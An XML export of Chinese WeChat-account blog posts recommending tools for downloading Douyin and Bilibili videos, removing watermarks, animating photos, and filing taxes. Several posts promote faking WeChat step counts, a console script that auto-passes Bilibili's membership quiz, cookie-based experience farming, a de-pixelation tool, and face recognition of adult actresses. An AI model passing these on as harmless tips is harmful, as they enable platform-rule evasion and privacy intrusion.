    <content type="text"><![CDATA[苏生不惑第229 篇原创文章，将本公众号设为星标，第一时间看最新文章。 不老男人刘德华最近开通抖音了，我也是在微博上看到才发现的，为了看他的抖音我再次下载了抖音APP（如果有网站就好了，上次也是为了写文章一键批量下载抖音无水印视频 才下载的），然后下载了他所有视频，正好再分享几个下载抖音工具。 goannie这是个基于annie的命令行下载工具https://gitee.com/rock_rabbit/goannie （如果下载不了在公众号后台回复抖音获取软件），支持bilibili，腾讯，抖音，爱奇艺，西瓜，火锅，好看等视频网站。 首先在APP里复制抖音主页地址 https://v.douyin.com/eLhwxF2/浏览器打开会跳转到https://www.iesdouyin.com/share/user/562575903556992?sec_uid=MS4wLjABAAAAU7ibxriLF-GSBF5QKa1Op9hxcMAPVmzmXwXqqvMfrhs&amp;did=1512521023104286&amp;iid=4486442028906093&amp;timestamp=1616050520&amp;utm_source=copy&amp;utm_campaign=client_share&amp;utm_medium=android&amp;share_app_name=douyin ，打开软件复制地址回车即可下载。 很快下载了17个视频。而且都是无水印的。当然也支持下载单个视频，比如这个没想到吧，我从天台出现 %刘德华天台名场面挑战 https://v.douyin.com/eLXBnJE/单个视频也可以在浏览器直接用idm下载。 还有西瓜视频下载 https://www.ixigua.com/6906394328315200013还支持下载b站up主所有视频https://space.bilibili.com/2026561407 ，也可以使用之前分享的 又一视频下载神器，一键下载b站收藏夹视频和up主所有视频类似的命令行工具还有抖音批量采集，复制链接打开软件自动解析下载 。 抖音下载小助手如果不习惯用命令行可以使用这个抖音下载小助手（在公众号后台回复抖音获取软件） ，复制主页链接开始下载，如果想换地址双击左侧删除即可。 最后分享个在线下载视频网站（支持抖音，快手，火山小视频）， https://tools.didaho.com/#/watermark ，比如下载这个快手视频https://v.kuaishou.com/5KV6BI 最近原创文章： 不限速的阿里云盘预约公测即将截止，快来领取3T容量 好玩，这个APP 用 AI 让老照片动起来了 5分钟搞定b站答题成为正式会员，每天自动刷经验值升级账号 2021 微信运动一键刷步数，让你成功占领封面 来领钱了，手把手教你申报 2020 个人所得税 一键添加和去除图片/视频水印 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一键添加和去除图片/视频水印]]></title>
    <url>%2F2021%2F04%2F02%2F%E4%B8%80%E9%94%AE%E6%B7%BB%E5%8A%A0%E5%92%8C%E5%8E%BB%E9%99%A4%E5%9B%BE%E7%89%87-%E8%A7%86%E9%A2%91%E6%B0%B4%E5%8D%B0%2F</url>
    <content type="text"><![CDATA[苏生不惑第228 篇原创文章，将本公众号设为星标，第一时间看最新文章。 之前文章分享过视频去水印 一键去除腾讯/优酷/爱奇艺/b站视频水印 ，今天再来说说图片去水印。 在线网站打开美图秀秀在线版 http://xiuxiu.web.meitu.com ，上传图片选择消除笔，在水印上轻轻一抹，稍等一下就可以了 。对比下前后效果。 还有网站 www.theinpaint.com/ theinpaint除了在线版还有客户端软件版本（Windows，Mac，iOS） https://wwi.lanzous.com/ievqWn02dwf 公众号后台回复 水印 获取软件。 以及支持批量去除图片水印。 在线ps网站 https://www.photopea.com/ ，之前的文章不会 ps 没关系，在线一键抠图 介绍过它 ，上传图片找到污点修复笔刷，往水印处涂抹一下就好了。 HitPaw Watermark Removerhttps://wwi.lanzous.com/i89mcmtdrsj这个除了去除视频水印，还支持去除图片水印（公众号后台回复 水印 获取软件）。去除水印后效果。 水印管家https://wwi.lanzous.com/iYpanmte6qh这个软件支持图片去水印，视频去水印，短视频无水印提取，图片加水印，视频加水印。上传图片选择位置去除即可。还可以加水印。 除了使用以上软件还有个技巧，使用谷歌搜索找无水印图片，关于搜图之前文章 如何通过电影截图找到电影 也分享过，比如这张含微博水印的周星驰图片。 谷歌可以找到这篇文章http://www.dcchinese.online/article-144494-1.html 文章里就有这张无水印图。 最后如果你想给证件照打水印推荐2个网站 http://watermark.dxcweb.com/ ，https://0x0ffff.com/watermark/ ，纯前端图片加水印，拒绝上传保证个人信息安全 。 还有这个开源的简单水印 APP https://github.com/rosuH/EasyWatermark ，如果下载不了公众号后台回复水印获取软件。 最近原创文章： 不限速的阿里云盘预约公测即将截止，快来领取3T容量 好玩，这个APP 用 AI 让老照片动起来了 5分钟搞定b站答题成为正式会员，每天自动刷经验值升级账号 2021 微信运动一键刷步数，让你成功占领封面 来领钱了，手把手教你申报 2020 个人所得税 又一视频下载神器，一键下载b站收藏夹视频和up主所有视频 建了个微信交流群，和我一起在 b 站学 Python 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[好玩，这个APP用AI让老照片动起来了]]></title>
    <url>%2F2021%2F04%2F02%2F%E5%A5%BD%E7%8E%A9%EF%BC%8C%E8%BF%99%E4%B8%AAAPP%E7%94%A8AI%E8%AE%A9%E8%80%81%E7%85%A7%E7%89%87%E5%8A%A8%E8%B5%B7%E6%9D%A5%E4%BA%86%2F</url>
    <content type="text"><![CDATA[苏生不惑第227 篇原创文章，将本公众号设为星标，第一时间看最新文章。 这两天在微博上看到个网站能让老照片动起来https://weibo.com/6543766562/K4KZOjDCz，效果如图： 网址为https://www.myheritage.com/deep-nostalgia，上传图片就能让图片中的人活灵活现的动起来，还可以导出视频，不过很可惜国内无法访问。 而且已经有了对应的APP，比如ios上的avatarify https://github.com/alievk/avatarify ，安卓上的LicoLico https://licolico.cn/home/#/home ，演示效果见https://github.com/PaddlePaddle/PaddleGAN/blob/develop/README_cn.md 我下载的是安卓（公众号后台回复 照片 获取下载地址），里面有很多的模板，比如老照片动起来，ai换头，多人合唱等。 用了哥哥的一张图 。 生成的视频见视频号： 我把网页上下载的视频转成GIF（之前文章分享过如何将视频轻松转换为 GIF）蚂蚁呀嘿的效果：动起来的效果： 最近原创文章： 不限速的阿里云盘预约公测即将截止，快来领取3T容量 一键去除腾讯/优酷/爱奇艺/b站视频水印 5分钟搞定b站答题成为正式会员，每天自动刷经验值升级账号 2021 微信运动一键刷步数，让你成功占领封面 来领钱了，手把手教你申报 2020 个人所得税 又一视频下载神器，一键下载b站收藏夹视频和up主所有视频 建了个微信交流群，和我一起在 b 站学 Python 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[不限速的阿里云盘预约公测即将截止，快来领取3T容量]]></title>
    <url>%2F2021%2F04%2F02%2F%E4%B8%8D%E9%99%90%E9%80%9F%E7%9A%84%E9%98%BF%E9%87%8C%E4%BA%91%E7%9B%98%E9%A2%84%E7%BA%A6%E5%85%AC%E6%B5%8B%E5%8D%B3%E5%B0%86%E6%88%AA%E6%AD%A2%EF%BC%8C%E5%BF%AB%E6%9D%A5%E9%A2%86%E5%8F%963T%E5%AE%B9%E9%87%8F%2F</url>
    <content type="text"><![CDATA[苏生不惑第226 篇原创文章，将本公众号设为星标，第一时间看最新文章。 之前的文章分享过百度网盘下载太慢？不限速的阿里云盘来了 ，现在可以预约公测了，3月17日就截止了，速度了。进入预约页面 https://yida.alibaba-inc.com/o/aliyundrive/apply#/ 之后预约邮箱会收到邮件。 下载阿里云APP输入预约手机获取公测福利口令，之前参与内测过的用户会获得3T容量（合并Teambition的容量，需要同时登陆阿里云盘和 Teambition 两个app）。 网页版也可以使用 https://aliyundrive.com/ ，上传速度挺快的。 虽然还没有分享功能，不过通过idm可以获取下载地址。 下载速度真让百度网盘汗颜。 如果你还用天翼云盘，分享几个不用登录的高速解析下载网站 http://alsy.top/189cloud.html ，http://www.xwxx666.fun/，https://tmp.feilongproject.com/189cloud.html还有个天翼云盘的资源分享站 https://yun.hei521.cn/ 上周刚写过文章不限速的阿里云盘预约公测即将截止，快来领取3T容量 ，这周阿里云盘已经开始公测了https://www.aliyundrive.com/download而且即将提供桌面端，平板，微信小程序，使用上更方便了。不过我觉得应该先加上分享功能，这样才好传播，目前小于100MB的文件我都是用的蓝奏云，不用担心链接像百度网盘那样可能挂掉，而且下载速度快。 额外说下蓝奏云有好几个域名 pan.lanzous.com ，pan.lanzoux.com，pan.lanzoui.com，www.lanzous.com，wwi.lanzous.com，如果一个打不开切换着用。 除了初始的容量，这次公测还可以做任务增加容量，开启相册备份这个我不建议开启。打开消息通知加100G。另外就是通过福利码来增加容量了，不过注意使用期限是1年，下面就分享些可用的福利码（每天可用三个，增加容量少则200G，多则500G，后续有新的福利码在公众号后台回复 阿里云 获取）。 发言人送你的，发言人求来的，飞跃彩虹，扫地僧头发多，戴老师爱较真， 上云上阿里云 ， 巴巴带你扩容，阿里云购爆款，达摩院招保洁，寄快递用裹裹 ，许愿不要过气，干翻百度，狠快的快科技，有容乃大，淘淘长肉肉了，科技美学直播，ITHOME 。 另外现在安卓更新到最新版2.0.7，在福利社里完成2个任务神马都有（上传图片视频文件等）和有名有姓（就是改昵称和头像，注意昵称改了不能改回去）可以领取512G+64G永久容量。 有了阿里云盘，现在百度（百度网盘），腾讯（微云），阿里（阿里云盘）3巨头都有了网盘服务，有竞争是好事，百度网盘一直让人诟病的就是下载限速，当然带宽成本是个问题，不知道阿里云盘宣称的永不限速是否真的永不，拭目以待吧，你觉得呢？https://weibo.com/7518378870/K7kaz2Z1B 现在可以迁移部分不重要的文件到阿里云盘了，毕竟上传下载速度体验很不错。 最近原创文章： 一键去除腾讯/优酷/爱奇艺/b站视频水印 5分钟搞定b站答题成为正式会员，每天自动刷经验值升级账号 2021 微信运动一键刷步数，让你成功占领封面 来领钱了，手把手教你申报 2020 个人所得税 又一视频下载神器，一键下载b站收藏夹视频和up主所有视频 建了个微信交流群，和我一起在 b 站学 Python 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一键去除腾讯/优酷/爱奇艺/b站视频水印]]></title>
    <url>%2F2021%2F03%2F12%2F%E4%B8%80%E9%94%AE%E5%8E%BB%E9%99%A4%E8%85%BE%E8%AE%AF-%E4%BC%98%E9%85%B7-%E7%88%B1%E5%A5%87%E8%89%BA-b%E7%AB%99%E8%A7%86%E9%A2%91%E6%B0%B4%E5%8D%B0%2F</url>
    <content type="text"><![CDATA[苏生不惑第225 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于下载视频之前分享过很多文章： 如何轻松下载腾讯/微博/优酷/爱奇艺/b站等全网视频？ 一键批量下载抖音无水印视频 如何下载 b 站大会员/腾讯/优酷/爱奇艺 VIP 视频 视频下载神器：支持腾讯/优酷/爱奇艺/b站/微博等全网视频 一键下载中国大学/网易云课堂/慕课网等课程视频和课件 今天来说说腾讯/优酷/爱奇艺/b站视频去水印。 在线视频去水印logo在爱奇艺上看视频，右上角会有个水印logo，像这样：分享个油猴脚本（公众号后台回复 水印 获取），可以去除腾讯，优酷，爱奇艺视频上的水印logo（b站的水印是嵌入进去的，没法在线去除）， 关于安装和使用油猴扩展见之前文章上不了谷歌如何安装 Chrome 扩展？，实用油猴脚本推荐，让你的谷歌浏览器更强大，下载油猴扩展后直接导入脚本文件即可。 使用油猴脚本后爱奇艺的水印logo不见了。 如果看视频嫌广告多，推荐Chrome扩展广告终结者https://www.adtchrome.com/，之前文章也分享过[如何去除烦人的垃圾广告](https://mp.weixin.qq.com/s/-Hz6DrSHeOdHZMFHc8-k6g)，[自动跳过 APP 启动广告](https://mp.weixin.qq.com/s/IpZjKX5qPRIr1NZkZkXAwA)，安装好扩展后再次打开爱奇艺可以看到广告一晃而过就开始播放视频，看我录制的GIF图。 本地视频去水印上面的油猴脚本只能在线看的时候去除水印，有些视频下载后还是有水印，这就需要去水印工具了。 先用命令行（也可以使用之前推荐的工具）下载一个爱奇艺视频《再见达叔！吴孟达和周星驰合作的相声》https://www.iqiyi.com/v_24fcfnnw5tk.html下载后的视频右上角有个水印。 达叔和星爷合作过26部电影，给我们带来过很多欢乐，感谢达叔。 不过下载的视频文件格式是 f4v，虽然可以播放但不通用，这里再转换成mp4格式，可以在命令行直接转换ffmpeg -i &quot;再见达叔！吴孟达和周星驰合作的相声，再也等不到两位巨星的合作了-娱乐-完整版视频在线观看.f4v&quot; -c copy &quot;output.mp4&quot;也可以用vlc播放器 https://www.videolan.org/vlc/index.zh.html ，下载软件后点击菜单栏中的转换/保存按钮。点击配置文件右侧的工具按钮，选择保持原视频轨和原音频轨，确认后很快就转换为mp4格式了。下面开始去水印，推荐2个软件（公众号后台回复 水印 获取软件）Easy Video Logo Remover https://wwi.lanzous.com/iaiIcmtcxsj 和 HitPaw Watermark Remover。 https://wwi.lanzous.com/i89mcmtdrsj 打开Easy Video Logo Remover 导入视频文件。选择要去除水印的位置开始转换。等待一会就完成了，看去除水印后的效果。 HitPaw Watermark Remover 的使用同样简单，导入视频选择水印位置直接导出。 说个题外话，最近有个开源软件可以去除马赛克了 https://github.com/beurtschipper/depix 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[5分钟搞定b站答题成为正式会员，每天自动刷经验值升级账号]]></title>
    <url>%2F2021%2F03%2F12%2F5%E5%88%86%E9%92%9F%E6%90%9E%E5%AE%9Ab%E7%AB%99%E7%AD%94%E9%A2%98%E6%88%90%E4%B8%BA%E6%AD%A3%E5%BC%8F%E4%BC%9A%E5%91%98%EF%BC%8C%E6%AF%8F%E5%A4%A9%E8%87%AA%E5%8A%A8%E5%88%B7%E7%BB%8F%E9%AA%8C%E5%80%BC%E5%8D%87%E7%BA%A7%E8%B4%A6%E5%8F%B7%2F</url>
    <content type="text"><![CDATA[苏生不惑第225 篇原创文章，将本公众号设为星标，第一时间看最新文章。 文章开始前说下之前文章那些有趣的网站系列（十一） 的抽奖还在继续。2021 微信运动一键刷步数，让你成功占领封面 有人问为什么修改后不生效，注意下解压后有个txt文件不能删。 关于b站之前已经写过很多文章了： b 站账号快速升级到 Lv6：每天自动签到，观看，分享，投币视频 bilibili(b站)升级到BV号了，还想用av号怎么办？ 如何更优雅地使用 bilibili(b站) 想方便快捷的分享/收藏图片？试试免费好用的微博/b站图床 如何找回bilibili(b站)收藏夹里失效的视频？ 如何免登陆观看b站大会员番剧 借用 potplayer 播放器，在本地播放 b 站视频也能看弹幕了 下载b站外挂字幕,用 potplayer 播放视频也能看字幕了 建了个微信交流群，和我一起在 b 站学 Python 又一视频下载神器，一键下载b站收藏夹视频和up主所有视频 过年无聊？来b站看豆瓣电影 Top 250 没有b站大会员怎么看番剧 今天来说说怎么快速成为b站正式会员，b站和其他网站不一样，注册后不能评论，需要通过答题考试（或者邀请码）转正为正式会员才行。 我用了4年的号也没发邀请码的权限。 答题的话100个题目还是有点难，即使搜索也得答好久，今天分享个脚本帮你5分钟搞定，这里我用了个新手机号来注册答题。注册后进入 https://www.bilibili.com/v/newbie/basic-1?score=0 开始答题，共100题，得分过60才能通过，下面来演示下脚本怎么自动答题。 首先在公众号后台回复 b站 获取脚本，其实就是一段JavaScript代码，打开控制台复制代码运行即可，可以看到控制台在自动答题。 看我录制的GIF动图。 到了第50题脚本停止，因为要选择题目模块，这个得手动操作。再次复制脚本运行，很快就快60分了。答题通过，得分61，成为正式用户了。晋级成功 https://www.bilibili.com/v/newbie/upgrade?hid=1614858680682701 转正后积分还很低，为了快速升级可以通过GitHub脚本自动刷经验，这个之前文章分享过了b 站账号快速升级到 Lv6：每天自动签到，观看，分享，投币视频 ，不过现在脚本更新了，更方便操作了，首先打开控制台复制b站的cookie https://api.bilibili.com/x/web-interface/nav在GitHub fork这个项目 https://github.com/RayWangQvQ/BiliBiliTool ，在setting添加secrets ，就是刚才复制的cookie值。再开启GitHub action 。运行测试下。 测试成功，可能时间有点长，耐心等待会。之后会每天凌晨执行脚本帮你自动签到，观看，分享，投币视频，你也可以改下执行脚本时间 https://hub.fastgit.org/RayWangQvQ/BiliBiliTool.Docs/blob/main/questions.md ，在运行 bilibili-daily-task.yml 之后， Settings 下Environments 中会自动多出一个名为 Production 的环境，wait timer 填写分钟数。 之后每天早上9点左右收到微信通知。 每日奖励也都有了 https://account.bilibili.com/account/home 注意：如果收到b站提示风险，先把自动脚本停止了，只需要关闭action即可。 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些有趣的网站系列（十一）]]></title>
    <url>%2F2021%2F03%2F12%2F%E9%82%A3%E4%BA%9B%E6%9C%89%E8%B6%A3%E7%9A%84%E7%BD%91%E7%AB%99%E7%B3%BB%E5%88%97%EF%BC%88%E5%8D%81%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[苏生不惑第224篇原创文章，将本公众号设为星标，第一时间看最新文章。 文章开始前说下之前文章 来领钱了，手把手教你申报 2020 个人所得税 ，恭喜这位小伙伴抽中88的红包，今天的红包抽奖关键词为 有趣。 之前分享过有趣的网站有： 那些有趣的网站 那些有趣的网站（二） 那些有趣的网站系列（三） 那些有趣的网站系列（四） 那些有趣的网站系列（五） 那些有趣的网站系列（六） 那些有趣的网站系列（七） 那些有趣的网站系列（八） 那些有趣的网站系列（九） 那些有趣的网站系列（十） 这是系列第11篇。 网龄测试 还记得第一次接触网络是什么时候？来测试下你有多少年的网龄 https://www.arealme.cn/wanglingceshi/cn/ 显示人物年龄这个网站可以通过人脸识别和大数据分析自动显示人物年龄，只需上传图片就能进行识别，桂纶镁1983年生，还算准 https://cn.how-old.net/#results 知微舆论场可以查询微博，抖音，知乎等网站的历史热搜 https://trends.zhiweidata.com/ 千亿像素全景图超高分辨率360度全景图，探索包括北京、广州、天津以及日本京都等城市，可以360度感受中国大好河山 http://pf.bigpixel.cn/zh-CN.html ，类似的网站有 https://www.zhijianshang.com/ ，http://www.airpano.org.cn/360photo/beijing-china/ 查找英语电影台词 目前收录26000+电影，110000+集的美剧台词，也是个好用的英语学习网站 http://www.taicishe.com 图片在线编辑Adobe 新推出的图片在线编辑工具 https://photoshop.adobe.com/ 剧本生成器输入关键词给你自动生成一个短剧梗概 https://datamuse.guokr.com/web?page=ltd&amp;from_channel=play&amp;from=GK 豆瓣评分走势看看电影《唐人街探案3》的豆瓣评分走势，是一路下滑啊https://douyabot.com/ 带壳截图网站内置了丰富的样机模板，只需上传图片，选择对应的设备就能生成非常美观的带壳截图 https://deviceshots.com/ AI人脸识别女优又新出了女优不认识？AI一键识别 https://xslist.org/zh 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2021 微信运动一键刷步数，让你成功占领封面]]></title>
    <url>%2F2021%2F03%2F05%2F2021-%E5%BE%AE%E4%BF%A1%E8%BF%90%E5%8A%A8%E4%B8%80%E9%94%AE%E5%88%B7%E6%AD%A5%E6%95%B0%EF%BC%8C%E8%AE%A9%E4%BD%A0%E6%88%90%E5%8A%9F%E5%8D%A0%E9%A2%86%E5%B0%81%E9%9D%A2%2F</url>
    <content type="text"><![CDATA[苏生不惑第223 篇原创文章，将本公众号设为星标，第一时间看最新文章。 关于微信之前写过好几篇文章了： 你刚才微信上撤回了什么？我都看到了 c 盘空间又满了？微信清理神器帮你释放空间 如何导出你的微信语音 一键生成你的微信社交数据报告 如何发一条九宫格图片的朋友圈 集赞生成器：朋友圈集赞不求人 不为人知的几个微信实用技巧 要过年了，换个发微信红包新姿势 去年写的2020微信运动一键刷步数，让你重回排行榜第一 后来不能用了，不过今天小米运动又复活了，下载小米运动APP注册账号，在第三方接入绑定微信（如果要修改支付宝步数同时绑定下支付宝）。 然后打开软件（公众号后台回复 运动 获取软件），输入要修改的微信运动步数，小米运动账号和密码，就是这么简单。修改微信运动步数为66666，成功占领了封面。 如果要每天自动刷，可以借助腾讯云函数。还可以加微信通知。 现在每天刷网易云音乐听歌300首也是用的腾讯云函数，详情见之前的文章网易云音乐等级快速升级：每天自动打卡听歌300首还有每天自动签到百度贴吧，详情见之前文章签到太麻烦？全自动一键签到网易云音乐，b站，京东，百度贴吧等网站每天自动刷b站经验 b 站账号快速升级到 Lv6：每天自动签到，观看，分享，投币视频如果修改后微信运动步数没改，可以看看微信运动常见问题https://support.weixin.qq.com/cgi-bin/mmsupport-bin/readtemplate?t=wechat_movement_faq/index&amp;lang=zh_CN#/，或者在小米运动重新绑定微信。 说个题外话，最近新加的小伙伴一番话让我很感动，感谢支持，我会一直坚持更新原创文章（已经223篇，1000篇不远了），如果能帮到你真是荣幸。 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！ 公众号苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手把手教你申报2020个人所得税（已退税）]]></title>
    <url>%2F2021%2F03%2F05%2F%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0%E7%94%B3%E6%8A%A52020%E4%B8%AA%E4%BA%BA%E6%89%80%E5%BE%97%E7%A8%8E%EF%BC%88%E5%B7%B2%E9%80%80%E7%A8%8E%EF%BC%89%2F</url>
    <content type="text"><![CDATA[苏生不惑第222 篇原创文章，将本公众号设为星标，第一时间看最新文章。 去年分享过手把手教你申报2019个人所得税（已退税1800） ，今年3月1号开始又可以申报2020年的个人所得税了，昨天操作了下，顺利申请完退税，这里再分享下。 这次的个人所得税申报截止时间是6月30日，我去年申报的时间是4月21,5月18号退税到账的。 先说下为什么要年度申报?新个税法实施后，公司为员工每月代扣个人所得税，但这只是预缴，由于员工入职离职或者专项扣除信息未及时填写等原因可能会多缴或少缴，申报可以给纳税人查遗补漏的机会，多退少补。 个人所得税说明个人所得税综合所得汇算清缴的计算公式有点复杂，有兴趣可以看李永乐老师的视频https://www.weibo.com/3325704142/IDT676Uvl 应退或应补税额=[（综合所得收入额-60000元-“三险一金”等专项扣除-子女教育等专项附加扣除-依法确定的其他扣除-捐赠）×适用税率-速算扣除数]-2020年已预缴税额。 那么哪些人需要办理年度汇算？ 什么情况退税？ 2020年度综合所得年收入额不足6万元，但平时预缴过个人所得税的。2020年度有符合享受条件的专项附加扣除，但预缴税款时没有申报扣除的。因年中入离职或者部分月份没有收入等原因，减除费用6万元、“三险一金”专项扣除、子女教育等六项专项附加扣除、企业（职业）年金以及商业健康保险、税收递延型养老保险等扣除不充分的。 没有任职受雇单位，仅取得劳务报酬、稿酬、特许权使用费所得，需要通过年度汇算办理各种税前扣除的。纳税人取得劳务报酬、稿酬、特许权使用费所得，年度中间适用的预扣率高于全年综合所得年适用税率的。预缴税款时，未申报享受或者未足额享受综合所得税收优惠的，如残疾人减征个人所得税优惠等。有符合条件的公益慈善事业捐赠支出，但预缴税款时未办理扣除的等。 什么情况补税？ 在两个以上单位任职受雇并领取工资薪金，预缴税款时重复扣除了基本减除费用（5000元/月）。除工资薪金外，纳税人还有劳务报酬、稿酬、特许权使用费所得，各项综合所得的收入加总后，导致适用综合所得年税率高于预扣率等。 如果不做年度汇算清缴会有什么影响呢?多缴纳的个税无法退还（亏大了）， 少缴纳的个税不去补齐，有可能面临税务行政处罚，并被记入个人纳税信用档案（马虎不得）。 申报个人所得税可以使用个人所得税APP或者网页版 https://etax.chinatax.gov.cn/ 来申报 ，我习惯用网页版来操作，说实话网页版做得还是不错的，照顾到了我这种不喜欢用APP的人，点个赞。 说明下，由于最近申报的人比较多，尽量避开每天9-11点、14-16点、19-21点的高峰时段，我是晚上11点申报的。 话说去年申报完了，账号就没用了，这次通过手机号找回密码重新登录。登录后开始申报。 先填报专项附加扣除，子女教育，继续教育，大病医疗和赡养老人（60岁以上），房贷利息和住房房租，我选择了住房租金（和房贷利息只能二选一）。时间段选择2020.1.1到2021.1.1。 下一步进入到收入和税前扣除可以看到工资，劳务报酬什么的。比如我所在公司新浪的纳税数据。 点击右侧的详情可以看到我每个月交的保险，公积金什么的。 最后算出一个应纳税所得额。下一步进入税款计算。 这个数是根据所得额所在区间算的。然后选择你绑定的银行卡。 提交申请成功。看到进度是在退税中（如果觉得有问题可以撤销申请重新申报）。 还可以查询到2019年的申报数据，去年的已经退税完成。 今天的红包抽奖关键词是 个人所得税，在公众号后台回复 个人所得税，周一的抽奖 2021 年 3 月福利，小伙伴们来领微信红包 今天晚上开奖了。 最近原创文章： 又一视频下载神器，一键下载b站收藏夹视频和up主所有视频 没有b站大会员怎么看番剧 建了个微信交流群，和我一起在 b 站学 Python 那些有趣/实用的 Chrome 扩展神器系列（三） 分享几个学英语的好工具 过年无聊？来b站看豆瓣电影 Top 250 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2021 年 3 月福利，小伙伴们来领现金红包]]></title>
    <url>%2F2021%2F03%2F05%2F2021-%E5%B9%B4-3-%E6%9C%88%E7%A6%8F%E5%88%A9%EF%BC%8C%E5%B0%8F%E4%BC%99%E4%BC%B4%E4%BB%AC%E6%9D%A5%E9%A2%86%E7%8E%B0%E9%87%91%E7%BA%A2%E5%8C%85%2F</url>
    <content type="text"><![CDATA[3月来了，又到了发福利的时候了，之前发过的红包福利见文章： 大年初一领红包，恭喜发财，大吉大利 2021 年 2 月福利，小伙伴们来领微信红包 2021 年元旦福利，小伙伴们来领现金红包 2020 年 11 月福利，小伙伴们来领现金红包 2020年10月福利，小伙伴们来领现金红包 中秋/国庆节发福利了，小伙伴们来领现金红包 8月发福利了，小伙伴们来领现金红包 首先是2月份在公众号文章末尾评论天数超过10天的小伙伴（说明下评论仅限文章发布当天）。 总计42人，红包金额共1086元，加我微信领取，另外2月的发红包记录如图2021 年 2 月福利，小伙伴们来领微信红包 这个月开始不统计评论领红包了 ，之后都通过小程序来抽奖，不是每篇文章都发，大概一个月发8次抽奖左右，今天的红包抽奖在公众号后台回复 苏生不惑 抽奖，3号开奖。 目前公众号发布221篇原创文章了。大家有兴趣可以在历史文章进入文章列表查看。 公众号每周更新2-3篇原创文章，一般是早上8点20发，没有标题党，但愿没有浪费你时间，还能对你有帮助。 最近原创文章： 又一视频下载神器，一键下载b站收藏夹视频和up主所有视频 没有b站大会员怎么看番剧 建了个微信交流群，和我一起在 b 站学 Python 那些有趣/实用的 Chrome 扩展神器系列（三） 分享几个学英语的好工具 过年无聊？来b站看豆瓣电影 Top 250 最后说下，由于现在公众号信息流乱序了，已经不按时间倒序来展示你关注的公众号更新，如果不想错过我的文章，麻烦将本公众号设置为星标，这样就不用在你关注的那么多公众号里翻了 。 如果文章对你有帮助还请 点赞/在看/分享 三连支持下， 感谢各位！]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[图片搜索太模糊？无损放大图片神器来了]]></title>
    <url>%2F2021%2F02%2F26%2F%E5%9B%BE%E7%89%87%E6%90%9C%E7%B4%A2%E5%A4%AA%E6%A8%A1%E7%B3%8A%EF%BC%9F%E6%97%A0%E6%8D%9F%E6%94%BE%E5%A4%A7%E5%9B%BE%E7%89%87%E7%A5%9E%E5%99%A8%E6%9D%A5%E4%BA%86%2F</url>
    <content type="text"><![CDATA[苏生不惑第221篇原创文章，将本公众号设为星标，第一时间看最新文章。 话说昨天文章 建了个微信交流群，和我一起在 b 站学 Python 发出去后，群里已经快200人了，你要一起学Python吗？ 之前分享过图片搜索 如何通过电影截图找到电影 ，不过如果图片不清晰的话可能搜不到结果，这里分享几个图片无损放大神器。 Waifu2x使用卷积神经网络智能无损在线放大图片，可无损放大两倍，针对二次元图片效果更好 http://waifu2x.udp.jp/，而且是开源的 https://github.com/nagadomi/waifu2x 它还有客户端软件 https://github.com/lltcggie/waifu2x-caffe 以及基于Waifu2x的Waifu2x-Extension-GUI ，它使用机器学习放大图片/视频/GIF 以及视频补帧 https://github.com/AaronFeng753/Waifu2x-Extension-GUI/blob/master/README_CN.md https://gitee.com/aaronfeng0711/Waifu2x-Extension-GUI效果如图： bigjpg使用最新人工智能深度学习技术——深度卷积神经网络放大图片，它会将噪点和锯齿的部分进行补充，实现图片的无损放大 https://bigjpg.com/ 上传图片放大后直接下载，而且还支持Windows，ios，安卓，微信小程序。 pixfix这个跟 bigjpg 使用一样 https://zh.pixfix.com/ 另外有些图含有水印什么的，也可能导致搜索结果不理想，可以先找无水印图片再二次搜索，比如这张含微博水印的周星驰图片。 谷歌可以找到这篇文章 无水印图就是这张了。 之前文章 想方便快捷的分享/收藏图片？试试免费好用的微博/b站图床 还写过根据无水印图片查找微博博主，关于微博图片的尺寸再说下，比如在微博上看到这张周杰伦的图片，图片地址 http://ww1.sinaimg.cn/thumbnail/c08d7e89ly1g3efjakqsaj20hs0b4dgt.jpg 这图片也太小了，根本看不清，怎么找到清晰图呢？微博会生成几张不同尺寸的图片，常用的有以下几种格式：1234缩略图地址http://ww1.sinaimg.cn/thumbnail/c08d7e89ly1g3efjakqsaj20hs0b4dgt.jpg 小图地址http://ww1.sinaimg.cn/small/c08d7e89ly1g3efjakqsaj20hs0b4dgt.jpg 中等图地址http://ww1.sinaimg.cn/bmiddle/c08d7e89ly1g3efjakqsaj20hs0b4dgt.jpg 大图地址http://ww1.sinaimg.cn/large/c08d7e89ly1g3efjakqsaj20hs0b4dgt.jpg 所以把小图URL地址中的thumbnail改为large图就很清晰了。知乎的头像也类似，比如知乎电影的头像 https://www.zhihu.com/org/zhi-hu-dian-ying-72 